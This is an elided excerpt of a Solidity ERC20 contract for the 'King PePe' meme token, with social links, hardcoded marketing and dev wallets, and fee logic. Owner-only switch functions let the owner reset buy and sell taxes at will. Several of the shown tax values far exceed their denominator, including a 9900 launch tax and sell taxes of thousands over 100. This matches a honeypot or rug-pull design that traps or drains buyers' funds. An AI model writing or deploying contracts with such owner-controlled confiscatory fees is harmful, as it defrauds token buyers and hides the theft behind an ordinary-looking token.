...
/**
Telegram: https://t.me/kingpepe_erc20
Twitter: https://twitter.com/kingpepe_erc20
Website: https://kingpepetoken.com/
*/
...
contract KingPePe is ERC20, Ownable {
    ...
    uint256 private tokenLiquidityThreshold = 30000000000 * 10**18;
    uint256 public maxWalletLimit = 200000000000 * 10**18;

    uint256 private genesis_block;
    uint256 private deadline = 1;
    uint256 private launchtax = 9900;

    address public marketingWallet = 0x42ea112016E219113526fD045793A10BDeEfb74C; 
    address private devWallet = 0xc9014478A29E8e8117dEBD179fB87676f3e69036;
    ...
    Taxes private taxes = Taxes(1000, 0, 1000, 100);
Taxes private sellTaxes = Taxes(2000, 0, 2000, 100);

    uint256 public TotalBuyFee = (taxes.marketing + taxes.liquidity + taxes.dev)/taxes.denominator;
    uint256 public TotalSellFee = (sellTaxes.marketing + sellTaxes.liquidity + sellTaxes.dev)/sellTaxes.denominator;
    ...
    constructor() ERC20("King PePe", "KPEPE") {
        _tokengeneration(msg.sender, 10000000000000 * 10**decimals());
    ...
    function _transfer(
        ...
        if (_liquidityMutex || exemptFee[sender] || exemptFee[recipient])
            ...
            feeswap = sellTaxes.marketing + sellTaxes.liquidity + sellTaxes.dev;
            feesum = feeswap;
            currentTaxes = sellTaxes;
            _taxDenominator = sellTaxes.denominator;
        } else if (!useLaunchFee) {
            feeswap = taxes.marketing + taxes.liquidity + taxes.dev;
            feesum = feeswap;
            currentTaxes = taxes;
    ...
    function DefaultSwitch_() external onlyOwner {
        taxes = Taxes(75, 0, 25, 100);
        sellTaxes = Taxes(75, 0, 25, 100);
    }
    
     function Switch_01() external onlyOwner {
        taxes = Taxes(75, 0, 25, 100);
        sellTaxes = Taxes(1000, 0, 1000, 100);
    }
